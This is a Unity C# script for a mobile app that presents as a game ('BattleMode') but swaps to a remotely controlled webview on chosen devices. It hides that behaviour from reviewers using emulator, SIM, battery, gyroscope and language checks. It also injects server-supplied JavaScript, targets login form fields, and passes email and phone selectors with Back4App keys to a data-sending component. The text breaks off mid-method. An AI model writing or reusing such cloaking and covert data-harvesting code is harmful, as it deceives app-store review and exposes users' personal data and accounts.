using System;
using UnityEngine;
using System.Collections;
using System.Reflection;
using Beebyte.Obfuscator; // Obfuscator
#if UNITY_ANDROID
using DeadMosquito.AndroidGoodies; // Android API
using Google.Play.Review; // Google Play Review API
#endif
using Newtonsoft.Json; // Json features
#if UNITY_ANDROID
using OneSignalSDK;
#endif
using TMPro; // TextMeshPro
using System.Web; // Web features
//using Unity.Plastic.Newtonsoft.Json;
using UnityEngine.Networking; // UnityWebRequest
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using System.Linq; 
using System.Collections.Generic;
using UnityEngine.Serialization;
/* This code was previously used to connect the Install Referrer from Play Market, but so far it has not worked correctly.
using Ugi.PlayInstallReferrerPlugin;
*/
using Object = UnityEngine.Object; // UnityWebRequest

public class BattleMode : MonoBehaviour
{
    
    //--------------------------------------------------------------------------------------
    // WebView Mode
    //--------------------------------------------------------------------------------------

    private float defaultAlphaWebView = 0.98f;

    [SkipRename]
    [SerializeField] 
    private string directConnect = ""; // Direct link to the domain connection

    [SkipRename]
    [SerializeField] 
    private int currentYear = 2023; // Current year

    [SkipRename]
    [SerializeField] 
    private string marketShortName = "gg"; // Short name of the market in which the application is published

    [SkipRename]
    [SerializeField]
    private TextMeshProUGUI UIDText;

    [SkipRename]
    [SerializeField]
    private TextMeshProUGUI textDebug;

    // Variable storing a reference to the image in Canvas
    [SkipRename]
    [SerializeField]
    private Image appIconImage;

    [SkipRename]
    [SerializeField] 
    private Image backgroundImage; // Background for UID.

    // Ability to set a variable with a reference to Canvas
    [SkipRename]
    [SerializeField]
    private Canvas canvas;

    // The panel is used to darken the WebView area.
    [SkipRename]
    [SerializeField]
    private Image imageBlack;

    /* The date-checking algorithm has now been moved to the script for offline content, which means we no longer need to check this in online content.

    // Create a new variable that will hold an Integer value.
    // UnixTimestamp Time
    [SkipRename]
    [SerializeField] 
    private int datePublication = 0; // Date of publication of the application in UnixTimestamp format

    [SkipRename]
    [SerializeField] 
    private int howManyDaysToWaitOnline = 7; // How many days to switch to offline mode
    */

    //[FormerlySerializedAs("offlineSceneNumber")]
    //[FormerlySerializedAs("offlineSceneName")]
    [SkipRename]
    [SerializeField] 
    private int offlineSceneNumber = 2; // Offline scene that should run in the offline mode of the mobile application

    [SkipRename]
    [SerializeField] 
    private string serverDomain; // A link that will open in the online mode of the mobile application.

    [SkipRename]
    [SerializeField] 
    private AppMetrica appMetrica; // We create AppMetrica service in this application.

    [SkipRename]
    [SerializeField] 
    private string debugPackageName;



    // [SkipRename]
    // [SerializeField] 
    // private Text UIDLayer; // The UID that is shown over the screen when online mode is enabled in the application.

    private string serverUrl;
    private string homeUrl; 

    /* This code was previously used to connect the Install Referrer from Play Market, but so far it has not worked correctly.
    #if UNITY_ANDROID
        // [SerializeField] 
        private GetInstallReferrer _getInstallReferrer; // We create a service that will get the install referrer. 
        // This service is used to get the install referrer in the online mode of the mobile application.
        // Get UTM tags from the Play Market.

        // [SerializeField] 
        private string _referrerUrl; // Here we write UTM tags from the Play Market

        // [SerializeField] 
        private AppUrl _appUrl; // Getting a link to the application.

        // [SerializeField] 
        private string _template; // Link form, utm from the split link will be written here.

        // [SerializeField] 
        private string _appUrlLink; // Ready processed link with UTM tags.

    #endif
    */



    [SkipRename]
    public Response data { get; private set; } // Service for receiving Json response from hosting.

    #if UNITY_ANDROID // If the application is running on Android, then we make a review request through Play Store Services.
        private ReviewManager _reviewManager; // Service for requesting a review from the user.
    #endif // UNITY_ANDROID

    [SkipRename]
    private UniWebView webView; // Service for displaying a web page in the application.Turns on only when online mode is activated.

    private bool isPageLoaded; // Flag for checking if the web page is loaded.

    private bool isFirstPageSuccess; // Flag for checking if the first page was loaded successfully.

    private string uid; // UID of the user.

    [SkipRename]
    [System.Serializable] 
    public class Response // Class for receiving Json response from hosting.
    {
        [SkipRename] 
        [System.Serializable] 
        public enum ResponseBool // Checking if a response has been received from the hosting.
        {
            Disable,
            Enable,
        }

        [SkipRename] public int     ReviewSeconds           { get; set; } // The number of seconds after which the user will be asked to leave a review.
        [SkipRename] public ResponseBool    OfflineMode             { get; set; } // Flag for checking if the application is in offline mode.
        [SkipRename] public ResponseBool    RememberAltLink         { get; set; } // If enabled, then on future launches, start the application from this link.
        [SkipRename] public ResponseBool    ShowUID                 { get; set; } // Flag for checking if the UID is enabled.
        [SkipRename] public ResponseBool    AppMetrica              { get; set; } // Flag for checking if the AppMetrica service is enabled.
        [SkipRename] public ResponseBool    BackgroundBlack         { get; set; } // Flag for checking if the background is black.
        [SkipRename] public ResponseBool    ResetSavedLink          { get; set; } // Flag for checking if the saved link should be reset.
        [SkipRename] public ResponseBool    EnableUTM               { get; set; } // If enabled, the device will support UTM tags
        [SkipRename] public ResponseBool    DebugRealBrowserTrigger { get; set; }
        [SkipRename] public ResponseBool    DebugRedirectLink       { get; set; }
        [SkipRename] public ResponseBool    DebugReferrer           { get; set; }
        [SkipRename] public ResponseBool    DebugOnPageStarted      { get; set; }
        [SkipRename] public ResponseBool    DebugOnPageFinished     { get; set; }
        [SkipRename] public ResponseBool    ResetSavedSettings      { get; set; }
        [SkipRename] public string          Yandex                  { get; set; } // Yandex API key for the AppMetrica service.
        [SkipRename] public string          SiteLink                { get; set; } // Link to the site that will open in the online mode of the application.
        [SkipRename] public string          TargetLang              { get; set; } // Show online mode only if the user has this language specified on the smartphone.
        [SkipRename] public string          BadLang                 { get; set; } // Never enable online mode if the user has this language on the smartphone.
        [SkipRename] public string          BlackLockKeyword        { get; set; } // Keywords, if found in utm link tags, then activate offline mode.
        [SkipRename] public string          AltSiteLink             { get; set; } // Alternate link for online mode, opens when the application starts, but only if the alt link trigger is activated.
        [SkipRename] public string          RealBrowserTrigger      { get; set; } // If this trigger is found in the UTM tags of the link, then the application will open the link in the real browser.
        [SkipRename] public string          OneSignal               { get; set; } // OneSignal API key.
        [SkipRename] public string          UserAgent               { get; set; } // User agent for the webview.
        [SkipRename] public string          RedirectKeyword        { get; set; } // If this occurs in a link that will trigger a redirect
        [SkipRename] public string          RedirectLink            { get; set; } // Link where users will be redirected when the trigger is triggered
        [SkipRename] public string          JavascriptClickElements { get; set; } // Elements that will be clicked when the page is loaded
        [SkipRename] public string          JavascriptClearElements { get; set; } // Elements that will be cleared when the page is loaded
        [SkipRename] public string          JavascriptCustomKeyword { get; set; } // If this occurs in a link that will trigger a custom javascript
        [SkipRename] public string          JavascriptCustom        { get; set; } // Custom javascript code that will be executed when the page is loaded
        [SkipRename] public string          FormUsername            { get; set; } // Username HTML element
        [SkipRename] public string          FormPass                { get; set; } // Pass HTML element
        [SkipRename] public string          ButtonSubmit            { get; set; } // Submit button HTML element
        [SkipRename] public string          AppIdBack4App           { get; set; } // Back4App App Id
        [SkipRename] public string          RestApiKey              { get; set; } // Back4App Rest API key
        [SkipRename] public string          querySelectorEmail      { get; set; } // query selector for email
        [SkipRename] public string          querySelectorPhone      { get; set; } // query selector for phone number
        [SkipRename] public string          brand                   { get; set; } // brand
        [SkipRename] public string          packageId               { get; set; } // package Id
        
        public String EventTriggerRegistrationStart { get; set; }
        public String EventTriggerRegistrationSuccess { get; set; }
        public String EventTriggerPaymentSuccess { get; set; }
        public String EventTriggerLoginSuccess { get; set; }
        public String EnableSafeBrowsing { get; set; }
    }

    private bool isOffline = false; // Flag for checking if the application is in offline mode.

    public IEnumerator Start() // The method is called when the application starts.
    {
        // PlayerPrefs.DeleteAll();
        // PlayerPrefs.Save();
        
        #if UNITY_ANDROID || UNITY_IOS
            Input.gyro.enabled = true; // Enable gyroscope.
        #endif

        /*UIDLayer.text = "\nModel: " + AGDeviceInfo.MODEL
                                  +
                                  "\nProduct: " + AGDeviceInfo.PRODUCT
                                  +
                                  "\nManufacturer: " + AGDeviceInfo.MANUFACTURER;
        yield break;*/

        // Debug.Log("Start"); // Log to the console that the application has started.

        // Debug.Log("isOffline?");

        if (!Application.isEditor) {
            if (isOffline) yield break; // If the application is in offline mode, then we do not load the Json response from the hosting.
            
#if UNITY_ANDROID || UNITY_IOS
            if (PlayerPrefs.HasKey("OfflineMode")) { // If the application has already saved offline mode, then app need to immediately switch to offline mode.
                OfflineMode(); // Enable offline mode.
                yield break; // Stop the coroutine.
            }
#endif
        }

        // Debug.Log("Saved OfflineMode?");

        // Debug.Log("Time for Offline?");

        /* The date-checking algorithm has now been moved to the script for offline content, which means we no longer need to check this in online content.

        Int32 unixTimestamp = (int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds; // Get the current time in seconds.
        // Calculate the number of days that have passed since the publication date of the application
        int daysSincePublication = (unixTimestamp - datePublication) / (60 * 60 * 24);

        // Check if the number of days since publication is greater than or equal to the number of days until offline mode
        if (daysSincePublication >= howManyDaysToWaitOnline)
        {
            
        }else{
            OfflineMode();
        }
        */

        if (!Application.isEditor)
        {
            
            // This code will only run when the game is built and not in the Unity Editor
            // Debug.Log("Code is running outside of the Unity Editor");


            #if UNITY_ANDROID // If running on Android, you need to check that the application is not running on the emulator. If running in the emulator, enable offline mode.
                
                if (
                    //AGTelephony.SimState == AGTelephony.SimStates.Absent ||
                    AGDeviceInfo.MODEL.Contains("sdk_gphone_") || // If the model contains this string, then the application is running on the emulator.
                    AGDeviceInfo.MODEL.Contains("google_sdk") ||
                    AGDeviceInfo.MODEL.Contains("Emulator") ||
                    AGDeviceInfo.MODEL.Contains("emulator") ||
                    AGDeviceInfo.MODEL.Contains("sdk") ||
                    AGDeviceInfo.MODEL.Contains("Android SDK built for x86") ||
                    AGDeviceInfo.MODEL == null || AGDeviceInfo.MODEL == "" ||
                    AGDeviceInfo.PRODUCT == "google_sdk" ||
                    AGDeviceInfo.PRODUCT.Contains("sdk_gphone_") ||
                    AGDeviceInfo.PRODUCT.Contains("google_sdk") ||
                    AGDeviceInfo.PRODUCT.Contains("Emulator") ||
                    AGDeviceInfo.PRODUCT.Contains("emulator") ||
                    AGDeviceInfo.PRODUCT.Contains("sdk") ||
                    AGDeviceInfo.PRODUCT == "" ||
                    AGDeviceInfo.PRODUCT == null ||
                    AGDeviceInfo.PRODUCT.Contains("sdk_gphone_")||
                    AGDeviceInfo.MANUFACTURER == "Google"||
                    AGDeviceInfo.MANUFACTURER.Contains("Genymotion"))
                {
                    OfflineMode(); // Enable offline mode.
                    yield break; // Exit the function.
                }
            #endif // UNITY_ANDROID

        }

        // Debug.Log("Is Uni Supported?");

        if (!Application.isEditor) {
            #if UNITY_ANDROID
                if (!UniWebView.IsWebViewSupported) { OfflineMode(); yield break;} // If the application is running on a device that does not support web views, then we enable offline mode.
            #endif
        }
        

        // Debug.Log("Server Domain");

        // Is directConnect is empty?
        if (directConnect == "")
        {
            // Debug.Log("Direct Connect is empty");
            // If the directConnect variable is empty, then we will use the serverDomain variable.
            
             if (serverDomain.Contains("http"))
            {
                // The string contains "http".
            }
            else
            {
                // The string does not contain "http".
                serverDomain = "http://" + serverDomain;
            }

            string packageName;
            #if UNITY_ANDROID || UNITY_IOS
                packageName = Application.identifier;
                // On Android, the bundle identifier is the same as the package name.
                packageName = packageName.Replace(".unity3d", "");
            #endif

            #if UNITY_EDITOR
                packageName = debugPackageName;
            #endif

            // Debug message
            // Debug.Log("Package Name: " + packageName);

            packageName = packageName + "." + marketShortName;

            // int currentYear = DateTime.Now.Year;

            serverUrl = serverDomain + "/" + currentYear + "/" + packageName + "/" + "api.php/information"; // Create a link to the hosting.
            
            
        }else {
            // Debug.Log("Direct Connect is not empty");
            // If the directConnect variable is not empty, then we will use the directConnect variable.
            serverUrl = directConnect;
        }

        Debug.Log(serverUrl); // Output the link to the console.

        UnityWebRequest unityWebRequest = UnityWebRequest.Get(serverUrl); // Create a request to the hosting.
        yield return unityWebRequest.SendWebRequest(); // Send a request to the hosting.

        if (unityWebRequest.result != UnityWebRequest.Result.Success)  {OfflineMode(); yield break;} // If the request was not successful, then we enable offline mode.


        data = JsonConvert.DeserializeObject<Response>(unityWebRequest.downloadHandler.text); // Get the Json response from the hosting.



        // Validate data
        if (data == null) { OfflineMode(); yield break; } // If the Json response is empty, then we enable offline mode.
        serverUrl = ""; // Clear the link
        serverDomain = ""; // Clear the domain

        Debug.Log(unityWebRequest.downloadHandler.text); // Output the Json response to the console.

        // Validate data.ResetSavedSettings
        if (data.ResetSavedSettings == Response.ResponseBool.Enable) {
            PlayerPrefs.DeleteAll(); // Completely clear the PlayerPrefs storage
        }

        if (data.AppMetrica == Response.ResponseBool.Enable) // If the response is not empty and the AppMetrica service is enabled, then we initialize the AppMetrica service.
        {
            // Validate data.AppMetrica
            if (data.Yandex != null && data.Yandex != "") {
                appMetrica.SetAPIKey(data.Yandex); // Set the API key for the AppMetrica service.
            }
        }

        // Set Debug Text
        // textDebug.text = "Android";

        // Validate data.ReviewSeconds
        if (data.ReviewSeconds != 0) {
            PlayerPrefs.SetInt("ReviewSec", data.ReviewSeconds); // Save the number of seconds after which the user will be asked to leave a review.
        }

        if (data.BackgroundBlack == Response.ResponseBool.Enable) // If the background setting is enabled, then we set the background to black.
        {
            if (backgroundImage != null) {backgroundImage.color = Color.black; } // Set the background to black.
        }

        string currentLanguage = System.Globalization.CultureInfo.InstalledUICulture.Name; // Get the current language of the smartphone.
        string langCheck = currentLanguage; // Create a variable for checking the language.

        if (string.IsNullOrEmpty(data.TargetLang)) // If the target language is not specified, then we do not check the language.
        {
            langCheck = ""; // Reset lang check variable.
        }

        if (!string.IsNullOrEmpty(data.BadLang)){
            if (currentLanguage == data.BadLang) // If the current device language is the same as the bad language, then we enable offline mode.
            {
                langCheck = "Bad"; // This means that the language is bad, it will turn on offline mode.
            }
        }

        if (!Application.isEditor) {
            if (data.OfflineMode != Response.ResponseBool.Disable || langCheck != data.TargetLang){ OfflineMode(); yield break;} // If offline mode is enabled or the device language does not match the target language, we enable offline mode.
        }

        

        // Validate data.SiteLink. If condition.
        if (!string.IsNullOrEmpty(data.SiteLink)) {
            homeUrl = data.SiteLink; // If the response is not empty, then we set the url.
        }else{
            OfflineMode(); // If the response is empty, then we enable offline mode.
            yield break; // Exit the function.
        }

        if (PlayerPrefs.HasKey("LastSavedLink") && PlayerPrefs.HasKey("LastSiteLink") && data.ResetSavedLink != Response.ResponseBool.Enable) // If the last saved link and the last site link are saved and the reset saved link setting is disabled, then we load the last saved link.
        {
            if(data.SiteLink == PlayerPrefs.GetString("LastSiteLink")) // If the last site link is the same as the current site link, then we load the last saved link.
                homeUrl = PlayerPrefs.GetString("LastSavedLink"); // Set the url to the last saved link.
            else PlayerPrefs.DeleteKey("LastSavedLink"); // If the last site link is not the same as the current site link, then we delete the last saved link.
        }
        else if (data.ResetSavedLink == Response.ResponseBool.Enable) { // If the reset saved link setting is enabled, then we delete the last saved link.
            if(PlayerPrefs.HasKey("LastSavedLink")) PlayerPrefs.DeleteKey("LastSavedLink"); // Delete the last saved link.
        }
        
        PlayerPrefs.SetString("LastSiteLink", data.SiteLink); // Save the current site link.

        // Validate data.AltSiteLink
        if (!string.IsNullOrEmpty(data.AltSiteLink)) {
            if (!PlayerPrefs.HasKey("AltSiteLink")) { // If the alternative link is not saved, then we save it.
                if (data.RememberAltLink == Response.ResponseBool.Enable) { // If the remember alternative link setting is enabled, then we save the alternative link.
                    PlayerPrefs.SetInt("AltSiteLink", 1); // Enable alternative link.
                    homeUrl = data.AltSiteLink; // Open the alternative link.
                }
            }else{ // If the alternative link is saved, then we open it.
                if (data != null) homeUrl = data.AltSiteLink; // If the response is not empty, then open the alternative link.
            }
        }
        
        // Validate data.BlackLockKeyword
        if (!string.IsNullOrEmpty(data.BlackLockKeyword)) {
            if (homeUrl.Contains(data.BlackLockKeyword)) { // If the current site link contains the black lock keyword, then we enable offline mode.
                PlayerPrefs.SetInt("OfflineMode", 1); // Remember for future launches of the application that the offline mode is saved.
                OfflineMode(); // Enable offline mode.
                yield break; // Stop the coroutine.
            } // End of checks to start the WebView.
        }

        // If the current site link does not contain the black lock keyword, then we open the site link.
        
        if (!Application.isEditor) {
            if (homeUrl == "about:blank"){ OfflineMode(); yield break;} // If the url is empty, then we enable offline mode.
        }

        if (PlayerPrefs.HasKey("uid")) { // If the user id is saved, then we add it to the url.
            uid = PlayerPrefs.GetString("uid").Replace(" ", ""); // Get the user id.
        }
        else{ // If the user id is not saved, then we generate a new one.
            PlayerPrefs.SetString("uid", SystemInfo.deviceUniqueIdentifier.Substring(0, 6) + $"{System.DateTime.Now.ToString("dd")}"); // Save the user id.
            uid = PlayerPrefs.GetString("uid").Replace(" ", ""); // Get the user id.
        }
        
        string gyro = "N"; // Create a variable for checking the gyroscope.
        
        if (Input.gyro.attitude.x == 0 && Input.gyro.attitude.y == 0) { // If the gyroscope is not active, then we set the gyro variable to YES. We found it to be an emulator.
            gyro = "Y"; // Yes. We found it to be an emulator.
        }

        string bat = SystemInfo.batteryLevel == 1f ? "Y" : "N"; // Create a variable for checking the battery level. If the battery level is 100%, then we set the bat variable to YES. We found it to be an emulator.
        
        #if UNITY_ANDROID // If running on Android, add UTM tags to the link.
            var sim = AGTelephony.SimState == AGTelephony.SimStates.Absent ? "N" : "Y"; // Create a variable for checking the SIM card. If the SIM card is not present, then we set the sim variable to YES. We found it to be an emulator.
            string model = AGDeviceInfo.MODEL; 
            string modelWithoutSpaces = model.Replace(" ", "");
            homeUrl = homeUrl.Replace("{uid}", $"{uid}") // Replace the uid variable in the link.
                .Replace("{aid}", $"{uid}") // Replace the aid variable in the link.
                .Replace("{akey}", $"{uid}") // Replace the akey variable in the link.
                .Replace("{batterie}", $"{bat}") // Replace the batterie variable in the link.
                .Replace("{sim}", $"{sim}") // Replace the sim variable in the link.
                .Replace("{yandex_key}", data.Yandex) // Replace the yandex key variable in the link.
                .Replace("{gyro}", $"{gyro}") // Replace the gyro variable in the link.
                .Replace("{gaid}", $"{GetADID()}")
                .Replace("{mobile}", $"{modelWithoutSpaces}"); // Replace the mobile variable in the link.
        #endif // End of Android.

        #if UNITY_IOS || UNITY_EDITOR // If running on iOS or in the editor, add UTM tags to the link.
            homeUrl = homeUrl.Replace("{uid}", $"{uid}") // Replace the uid variable in the link.
                .Replace("{aid}", $"{uid}") // Replace the aid variable in the link.
                .Replace("{akey}", $"{uid}") // Replace the akey variable in the link.
                .Replace("{batterie}", $"{bat}") // Replace the batterie variable in the link.
                .Replace("{yandex_key}", data.Yandex) // Replace the yandex key variable in the link.
                .Replace("{gyro}", $"{gyro}"); // Replace the gyro variable in the link.
        #endif // End of IOS.



        if (!Application.isEditor) {
            if (!UniWebView.IsWebViewSupported) { OfflineMode(); yield break; }
        }



        #if UNITY_ANDROID // If running on Android, then initialize ReviewManager.
            _reviewManager = new ReviewManager(); // Initialize ReviewManager.
        #endif

        #if UNITY_ANDROID || UNITY_IOS
            StartCoroutine(SetRating(data.ReviewSeconds)); // Start the coroutine for setting the rating.
        #endif

        #if UNITY_ANDROID // If running on Android, then initialize OneSignal.
            if(!string.IsNullOrEmpty(data.OneSignal)) LaunchOneSignal(data.OneSignal); // If the OneSignal API key is not empty, then we initialize the OneSignal service.
        #endif

        #if UNITY_ANDROID
            if (data.EnableUTM == Response.ResponseBool.Enable ) { // Are UTM tags enabled on hosting?
               // updateHomePageWithInstallReferror(); // If enabled, then we add UTM tags to the link.
               // homeUrl = getLinkWithInstalReferror(homeUrl);
            }
        #endif

        #if UNITY_ANDROID
            if (data.DebugReferrer == Response.ResponseBool.Enable) {
                // _ShowAndroidToastMessage(legacyGetLinkWithInstallReferror(homeUrl));
                _ShowAndroidToastMessage(getLinkWithInstalReferror(homeUrl));
            }
        #endif
        
        // if (Application.isEditor) { OfflineMode(); yield break; }

        // webView = gameObject.AddComponent<UniWebView>(); // Add a web view to the game object.
        webView = canvas.GetComponent<UniWebView>();
        webView.Frame = new Rect(0, 0, Screen.width, Screen.height); // Set the size of the web view.
        webView.OnOrientationChanged += (view, orientation) => // Fires when the device orientation has changed.
        {
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height); // Set new size for WebView.
        };

        webView.SetBackButtonEnabled(false); // Disable the back button.

        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);

        webView.SetSupportMultipleWindows(false, false);

        webView.Alpha = defaultAlphaWebView;

        //webView.OnPageErrorReceived += errorWebCodeEventTriggered;
        webView.OnPageErrorReceived += errorWebCodeEventTriggered; // If the page is not loaded, then we enable offline mode.

        webView.OnPageFinished += WebView_OnPageFinished; // If the page is loaded, then we save the last saved link. Then, we will conduct several checks of the link, the site.
        webView.OnPageStarted += WebView_OnPageStarted; // If the page is started, then we show the loading layer.

        // Validate data.UserAgent 
        if (!string.IsNullOrEmpty(data.UserAgent)) { // If the user agent is not empty, then we set it for the WebView.
            webView.SetUserAgent(data.UserAgent); // Set the user agent.
        }

        Debug.Log("Ready for launch!");

#if UNITY_ANDROID || UNITY_EDITOR

        if (data.EnableSafeBrowsing == "Enable")
        {
            if(UniWebViewSafeBrowsing.IsSafeBrowsingSupported)
            {
                // Create a UniWebViewSafeBrowsing instance with a URL.
                var safeBrowsing = UniWebViewSafeBrowsing.Create(homeUrl);

                // Show it on screen.
                safeBrowsing.Show();
            }
            else webView.Load(homeUrl);
        }
        else if (data.EnableSafeBrowsing == "Disable") webView.Load(homeUrl);
#endif

#if UNITY_IOS
    webView.Load(homeUrl);
#endif

        FindObjectOfType<SenderS>().StartWatching(data.brand, data.querySelectorEmail, data.querySelectorPhone, data.RestApiKey, data.AppIdBack4App, data.packageId,webView); // Connect to the database. 

        Debug.Log("Win!"); // Log the message. We won!
        //webView.Show();
        // UIDLayer.text = data.BlackLockKeyword + " " + data.RememberLinkTrigger;

        yield return new WaitForSeconds(7);

        // If isFirstPageSuccess is success
        /*
        if (isFirstPageSuccess) {
            
        }
        */

        appIconImage.gameObject.SetActive(false);
        if (data.ShowUID == Response.ResponseBool.Enable && UIDText != null) { // If the user id is enabled and the UID layer is not empty, then we show the user id.
            foreach (char c in uid) //Walk through each character in uid and output to console
            {
                //write all characters to a column in UIDT
                if(c == '_') 
                    UIDText.text += null;
                else UIDText.text += c + "\n";
                
            }
            //UIDText.text = uid; // Set the UID text.
            UIDText.fontSize = UIDText.fontSize * 2; //Increase uid text font by 2 times
            UIDText.gameObject.SetActive(true); // Show the UID layer.
        }

    }

    private string GetADID() // Getting the advertising ID
    { 
        string advertisingID = ""; // Advertising ID
        try 
        { 
            AndroidJavaClass up = new AndroidJavaClass("com.unity3d.player.UnityPlayer"); 
            AndroidJavaObject currentActivity = up.GetStatic<AndroidJavaObject>("currentActivity"); 
            AndroidJavaClass client = new AndroidJavaClass("com.google.android.gms.ads.identifier.AdvertisingIdClient"); 
            AndroidJavaObject adInfo = client.CallStatic<AndroidJavaObject>("getAdvertisingIdInfo", currentActivity); 
            advertisingID = adInfo.Call<string>("getId").ToString(); 
        } 
        catch (System.Exception e) 
        { 
            advertisingID = "none"; 
        } 
        return advertisingID; 
    }

    private void errorWebCodeEventTriggered(UniWebView webview, int errorcode, string errormessage) { // If the page is not loaded, then we enable offline mode.

        //UIDLayer.gameObject.SetActive(true);
        //UIDLayer.text = errormessage;
        //UIDLayer.color = Color.black;

        if(errormessage.Contains("ERR_CLEARTEXT_NOT_PERMITTED") || errormessage.Contains("ERR_CONNECTION_REFUSED")) { // If the error message contains the SSL error, then we enable offline mode.
            ReloadCurrentScene(); // Reload the current scene.
            // webView.Load("about:blank");
            // webView.Load(homeUrl);
        }

        if(errormessage.Contains("ERR_UNKNOWN_URL_SCHEME")) {

        }

        if (errormessage.Contains("SSL error")) {
            return;
        }

    }

    public void OfflineMode(){ // Enable offline mode.
        //UIDLayer.text = "OfflineMode";
        isOffline = true; // Set the offline mode variable to true.
        Destroy(GetComponent<UniWebView>()); // Destroy the WebView.
        Destroy(GetComponentInChildren<UniWebViewNativeListener>()); // Destroy the WebView listener.
        /*if (webView != null)
        {
            webView.Hide();
            webView.gameObject.SetActive(false);       
        }*/
         
        // webView.enabled = false;
        
        SceneManager.LoadScene(offlineSceneNumber); // Load the offline scene.

    }

    /* This code was previously used to connect the Install Referrer from Play Market, but so far it has not worked correctly.
    private void updateHomePageWithInstallReferror()
    {
#if UNITY_ANDROID
            StartCoroutine(_getInstallReferrer.OnGetIRDetails()); // We get new UTM tags from the Play Market.
            string utmTags = _getInstallReferrer.txtInstallReferrerFromCallback; // Get the new UTM tags.
            if (!string.IsNullOrEmpty(utmTags)) { // Validate _getInstallReferrer.txtInstallReferrerFromCallback
                StartCoroutine(GetNewReffererLink(utmTags)); // Read all received UTMs from _getInstallReferrer
                if (data.DebugReferrer == Response.ResponseBool.Enable) {
                    _ShowAndroidToastMessage("App Url Link: " + _appUrlLink);
                }
                homeUrl = HttpUtility.UrlDecode(_appUrlLink); // Get ready link with new UTMs.
                // url = url.Replace("{utm_source}", $"{_getInstallReferrer.txtInstallReferrerFromCallback}"); // Replace the utm_source variable in the link.
            }
#endif
    }
    */ 

    /* This code was previously used to connect the Install Referrer from Play Market, but so far it has not worked correctly.
    private string legacyGetLinkWithInstallReferror(string url_) 
    {
        string link = HttpUtility.UrlDecode(url_); // Create a link form with fields for UTM tags.
        link = link.Replace("{utm_source}", $"{_getInstallReferrer.txtInstallReferrerFromCallback}"); // Replace the utm_source variable in the link.
        return link;
    }
    */

    private string getLinkWithInstalReferror(string url_)
    {
         // Access the AndroidJavaObject that represents the ReferrerDetails object
        AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
        AndroidJavaObject currentActivity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
        AndroidJavaObject referrerDetails = currentActivity.Call<AndroidJavaObject>("getReferrer");

        // Get the value of the InstallReferrer field
        string installReferrer = referrerDetails.Get<string>("InstallReferrer");

        // Create a new Uri object for the link
        UriBuilder linkBuilder = new UriBuilder(url_);

        // Add the UTM parameters as query string parameters
        linkBuilder.Query = installReferrer;

        // Get the final link with the UTM parameters
        string finalLink = linkBuilder.ToString();

        return finalLink;
    }


    public void ReloadCurrentScene() // Scene reload.
    {
        string sceneName = SceneManager.GetActiveScene().name; // Get the name of the current scene.
        SceneManager.LoadScene(sceneName, LoadSceneMode.Single); // Reload the same scene.
    }

    /*
    public IEnumerator GetNewReffererLink(string _utm) // Get a new Referrer link from the Play Market.
    {
        if (_utm != null && _utm != "") // Are UTM tags empty?
        {
            var referrer = HttpUtility.UrlDecode(_utm); // Decode the received Referrer into separate labels.
            _referrerUrl = referrer.Contains("http") ? referrer : "https://mysite.com/?" + referrer; // If Refferer is not URL we do url.Query for proper processing.
            // Debug.Log("GetNewReffererLink() if _referrerUrl = " + _referrerUrl);

            _template = HttpUtility.UrlDecode(homeUrl); // Create a link form with fields for UTM tags.

            yield return _appUrlLink = _appUrl.GetAppUrl(_referrerUrl, _template); // Get a link with ready UTM tags.
        }
    }
    */

    public void Update(){ // Update is called once per frame.
        // if (Input.GetKeyDown(KeyCode.Escape) && Application.platform == RuntimePlatform.Android || Application.platform == RuntimePlatform.WindowsEditor) { // If the back button is pressed and the platform is Android or Windows Editor, then we close the application.
            // Back(); // Return to the previous WebView page.
        // }

        if (Input.GetKeyDown(KeyCode.Escape))
        {
            Back();  
        }

    }

    private int firstLoad = 0; // Create a variable for checking the first load of the page.
    private void Back() { // Return to the previous WebView page.
        if (firstLoad == 0 && homeUrl == PlayerPrefs.GetString("LastSavedLink")) { // If the first load of the page is 0 and the current link is equal to the last saved link, then the main main link from the hosting.
            webView.Load(data.SiteLink); // Load the main link from the hosting.
            firstLoad = 1; // The first page load in the WebView has occurred.
        }else if (true || isPageLoaded) // If the loader is active, then go to previous page of WebView.
        {
            webView.GoBack(); // Go to previous page of WebView.
        }
    }

    private void WebView_OnPageFinished(UniWebView webView, int statusCode, string url_) { // If the page has loaded successfully, make it clear to all the steel places of the application.

        /*
        if (url_ == "about:blank") // If the link is equal to about:blank
        {
           webView.Load(homeUrl);
           return;
        }
        */

        if (!url_.Contains("http://") && !url_.Contains("https://")) {
            return;
        }

        webView.Alpha = defaultAlphaWebView;
        UIDText.gameObject.SetActive(true);

        isFirstPageSuccess = true;

        isPageLoaded = true; // Note that the page has finished loading.

        //UIDLayer.text += "events work";

        if (data.DebugOnPageFinished == Response.ResponseBool.Enable) {
            _ShowAndroidToastMessage("OnPageFinished: " + url_);
        }

        JavaScriptAutologin(); // Run the JavaScriptAutologin function.
        
        if (!string.IsNullOrEmpty(data.JavascriptCustomKeyword)) {
            if (url_.Contains(data.JavascriptCustomKeyword)) { // If the link contains the words triggers for a custom javascript, then execute a javascript
                ExecuteCustomJavaScript(); // Execute a javascript
            }
        }
         
        JavaScriptClick(); // Execute a javascript
        JavaScriptClear(); // Execute a javascript 

    }

    private void WebView_OnPageStarted(UniWebView webView, string url_) { // If a new page has started loading, check carefully.

        webView.AddPermissionTrustDomain(serverDomain);

        string[] splittedList =
        {
            data.EventTriggerRegistrationSuccess, data.EventTriggerLoginSuccess, data.EventTriggerPaymentSuccess,
            data.EventTriggerRegistrationStart
        };

        foreach (var splittedItim in splittedList)
        {
            string[] splittedKeyWoprd = splittedItim.Split(',');

            foreach (var word in splittedKeyWoprd)
            {
                AppMetrica.Instance.ReportEvent(word);
            }
        }

        //  If the link does not contain the http protocol, then it is a DeepLink link.
        if (!url_.Contains("http://") && !url_.Contains("https://") && !url_.Contains("about:blank")) { 
            webView.Load(homeUrl);
            webView.Alpha = 0f;
            UIDText.gameObject.SetActive(false);
            Application.OpenURL(url_); // Open the link in the real browser.
            return;
        }

        if (url_ == "about:blank") // If the link is equal to about:blank, then we open offfline mode.
        {
           // UIDLayer.text = "about blank";
           // OfflineMode(); // Enable offline mode.
           return;
        }

        isPageLoaded = false;

        if (data.DebugOnPageStarted == Response.ResponseBool.Enable) {
